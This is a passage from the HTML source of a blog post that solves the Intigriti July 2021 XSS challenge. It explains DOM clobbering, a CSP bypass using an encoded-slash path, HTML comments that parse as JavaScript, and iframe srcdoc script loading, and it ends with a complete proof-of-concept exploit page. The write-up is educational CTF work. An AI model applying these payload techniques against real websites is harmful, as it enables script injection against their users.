+    <span class="token literal-property property">message</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token string">'x+1'</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    credentials
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+
+  <span class="token comment">// log window[Z]</span>
+  win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'logv'</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>
+    credentials
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>So <code>data</code> will be <code>ftp://a:a@a#&lt;img src=x onerror=alert(1)&gt;</code>, and it will be set to HTML, triggering XSS!</p>
+<p>No, things are not that easy… I forgot about CSP.</p>
+<h2><span id="level-6-bypassing-csp">Level 6: Bypassing CSP</span></h2><p>Although I can insert any HTML, unfortunately, this webpage also has CSP:</p>
+<pre class="line-numbers language-none"><code class="language-none">script-src 
+&#39;nonce-xxx&#39; 
+https:&#x2F;&#x2F;challenge-0721.intigriti.io&#x2F;analytics&#x2F; 
+&#39;unsafe-eval&#39;;
+
+frame-src https:;
+
+object-src &#39;none&#39;;base-uri &#39;none&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Since there is no <code>unsafe-inline</code>, our previous payload is invalid. In this CSP, <code>https://challenge-0721.intigriti.io/analytics/</code> is obviously a suspicious path.</p>
+<p>This page actually imports a file called <code>https://challenge-0721.intigriti.io/analytics/main.js</code>, but it has nothing in it, just some comments.</p>
+<p>When I saw this, I knew how to do it, because I had learned a technique to bypass CSP before, using <code>%2F</code> (encoded <code>/</code>) and the inconsistency between URL parsing on the front and back ends.</p>
+<p>Taking <code>https://challenge-0721.intigriti.io/analytics/..%2fhtmledit.php</code> as an example, for the browser, this URL is under <code>/analytics</code>, so it can pass the CSP check.</p>
+<p>But for the server, this segment is actually <code>https://challenge-0721.intigriti.io/analytics/../htmledit.php</code>, which is <code>https://challenge-0721.intigriti.io/htmledit.php</code>.</p>
+<p>So we successfully bypassed CSP and loaded files from different paths!</p>
+<p>Therefore, the goal now is to find a file where we can put JS code. Looking around, only <code>htmledit.php</code> seems to work, but isn’t it an HTML?</p>
+<h2><span id="level-7-constructing-js-code">Level 7: Constructing JS Code</span></h2><p>If you still remember, there is an HTML comment at the beginning of this page:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- &amp;lt;img src=x&amp;gt; --></span>
+....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>In some cases, this syntax is actually a comment in JS. It’s not me saying it, it’s in the specification:</p>
+<p><img src="/img/others/xss-july.jpg" alt="ECMAScript spec"></p>
+<p>In other words, we can take advantage of this and create a file that looks like HTML but is actually valid JS!</p>
+<p>The URL I finally came up with is: <code>https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*</code></p>
+<p>The generated HTML looks like this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 1; 這邊都是註解
+top.alert(document.domain);/* --></span> 這之後也都是註解了
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The first line is a comment, and everything after <code>/*</code> is also a comment, so this entire section is actually just <code>top.alert(document.domain);</code>.</p>
+<p>However, it’s worth noting that the content type of htmledit.php doesn’t change and is still <code>text/html</code>. The reason we can import it as JS is because of the same origin relationship. If you import an HTML file from a different origin as JS, it will be blocked by <a target="_blank" rel="noopener" href="https://www.chromium.org/Home/chromium-security/corb-for-developers">CORB</a>.</p>
+<p>At this point, we can make <code>data</code> equal to <code>&lt;script src=&quot;https://challenge-0721.intigriti.io/htmledit.php?code=1;%0atop.alert(document.domain);/*&quot;&gt;&lt;/script&gt;</code>, and it will execute when <code>text_tag.innerHTML = data</code> is called, bypassing CSP and successfully inserting the script into the page!</p>
+<p>But unfortunately, we’re not quite there yet…</p>
+<h2><span id="level-8-executing-dynamically-inserted-scripts">Level 8: Executing dynamically inserted scripts</span></h2><p>Just when I thought I was about to pass the level, I found that my script wouldn’t execute no matter what I did. I looked up some <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml">keywords</a> and found out that if you insert a script tag using innerHTML, it won’t execute.</p>
+<p>I tried searching for solutions using keywords like <code>innerhtml import script</code> or <code>innerhtml script run</code>, but I couldn’t find anything.</p>
+<p>Finally, I thought of trying <code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code>. It was a bit of a long shot, but I figured I might as well try it since I had nothing to lose.</p>
+<p>As it turns out, it worked. If the content is <code>&lt;iframe srcdoc=&quot;&lt;script src=&#39;...&#39;&gt;&lt;/script&gt;&quot;</code>, it will load the script directly.</p>
+<h2><span id="final-solution">Final solution</span></h2><p>One last thing to note is that before submitting my answer, I found that my answer wouldn’t work on Firefox. The reason is this piece of code:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>users<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>users<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>In Chrome, <code>window.users</code> will be an HTMLCollection, but in Firefox, it will only get one a element, and <code>window.users.admin</code> will be undefined.</p>
+<p>However, this isn’t a big problem. You can solve it by adding another layer of iframe:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>store<span class="token punctuation">"</span></span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
+  &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#>&lt;/a>' name=users>
+<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>My final answer looks like this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>XSS POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> htmlUrl <span class="token operator">=</span> <span class="token string">'https://challenge-0721.intigriti.io/htmledit.php?code='</span>
+    <span class="token keyword">const</span> exploitSrc <span class="token operator">=</span> <span class="token string">'/analytics/..%2fhtmledit.php?code=1;%0atop.alert(document.domain);/*'</span>
+    <span class="token keyword">const</span> insertPayload<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe srcdoc="&lt;script src=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>exploitSrc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">>&lt;\/script>"></span><span class="token template-punctuation string">`</span></span>
+    <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+      &lt;a id="DEV">&lt;/a>
+      &lt;iframe name="store" srcdoc="
+        &lt;iframe srcdoc='&lt;a id=admin href=ftp://a:a@a#</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>insertPayload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">>&lt;/a>' name=users>
+      ">
+      &lt;/iframe>
+      &lt;iframe name="iframeConsole" src="https://challenge-0721.intigriti.io/console.php">&lt;/iframe>
+    </span><span class="token template-punctuation string">`</span></span>
+    <span class="token keyword">var</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>htmlUrl <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token comment">// wait for 3s to let window loaded</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> credentials <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'a'</span>
+      <span class="token punctuation">&#125;</span>
+      win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'reassign'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">message</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+          <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'s'</span><span class="token punctuation">,</span>
+          <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token string">'u'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        credentials
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+
+      win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'reassign'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">message</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+          <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>
+          <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token string">'x+1'</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        credentials
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+
+      win<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">cmd</span><span class="token operator">:</span> <span class="token string">'logv'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span>
+        credentials
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>
+
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="other-solutions">Other solutions</span></h2><p>My method was to open a new window to post a message, but you can also embed yourself as an iframe and let htmledit.php embed it. In this case, you can also use top.postMessage to send messages.</p>
+<p>Embedding yourself in another webpage is something I often forget.</p>
+<p>Another unexpected solution is based on this piece of code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">case</span> <span class="token string">"log"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[log]: "</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">.</span>text<span class="token punctuation">,</span> type<span class="token operator">=</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">break</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The key point here is <code>type=e.data.message.type</code>, which sets a global variable called <code>type</code>. Therefore, you can pass in any payload through this and then call <code>logv</code>. This eliminates the need to handle the payload in the <code>a</code> tag.</p>
+<h2><span id="summary">Summary</span></h2><p>I really like this challenge because it feels like a series of levels that you have to pass one by one. Every time I thought I was about to pass a level, I would get stuck again, until I finally solved all the levels and successfully executed XSS.</p>
+<p>From this challenge, you can learn the following frontend knowledge:</p>
+<ol>
+<li>DOM clobbering</li>
+<li>JS comments are not just <code>//</code> and <code>/* */</code></li>
+<li>Bypassing CSP for paths</li>
+<li>Scripts added with innerHTML won’t execute</li>
+<li>You can use iframe srcdoc to bypass this (but in general, you should add a script tag and append it)</li>
+</ol>
+<p>From this topic, you can learn or review many skills. The interesting point of CTF and this type of challenge is here. Although you may know everything separately, it is very challenging to carefully string them together, which tests experience and skills.</p>
+<p>If you are interested in XSS challenges, you can follow <a target="_blank" rel="noopener" href="https://twitter.com/intigriti">Intigriti</a> and wait for the next challenge.</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Front-end/">#Front-end</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2021/08/22/en/cdnjs-and-supply-chain-attack/">Understanding Front-end Supply Chain Attacks and Defenses through the Vulnerability of cdnjs</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2021/07/10/en/cookie-bomb/">DoS Attack Using Cookie: Cookie Bomb</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2021/08/06/intigriti-xss-0721/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
